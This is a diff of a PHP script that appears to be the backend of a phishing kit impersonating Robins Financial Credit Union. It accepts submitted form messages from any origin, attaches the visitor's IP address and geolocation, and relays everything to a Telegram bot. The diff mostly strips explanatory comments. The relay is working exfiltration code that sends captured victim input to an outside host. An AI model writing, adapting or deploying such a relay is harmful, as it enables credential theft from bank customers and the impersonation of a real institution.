@@ -1,34 +1,29 @@
 <?php
-// api/send-telegram.php
+// send.php — Same folder as website files
 
-// Allow requests from ANY domain (CORS)
 header('Access-Control-Allow-Origin: *');
 header('Access-Control-Allow-Methods: POST, OPTIONS');
 header('Access-Control-Allow-Headers: Content-Type');
 header('Content-Type: application/json');
 
-// Handle preflight OPTIONS request
 if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
     http_response_code(200);
     exit;
 }
 
-// Your bot credentials
 const BOT_TOKEN = "BOT";
 const CHAT_ID = "CHAT_ID";
 
-// Get POST data from frontend
 $input = json_decode(file_get_contents('php://input'), true);
 $message = $input['message'] ?? '';
 $page = $input['page'] ?? 'unknown';
 
-// Validate message
 if (empty($message)) {
     echo json_encode(['success' => false, 'error' => 'No message provided']);
     exit;
 }
 
-// Get visitor's geo location
+// Geo location
 $geo = null;
 $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? null;
 
@@ -56,7 +51,7 @@ if ($ip) {
     }
 }
 
-// Build message footer
+// Footer
 $footerLines = [
     "",
     "🏦 <b>Robins Financial Credit Union</b>",
@@ -77,7 +72,6 @@ $fullMessage = $message . "\n" . implode("\n", $footerLines);
 
 // Send to Telegram
 $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
-
 $data = [
     'chat_id' => CHAT_ID,
     'text' => $fullMessage,
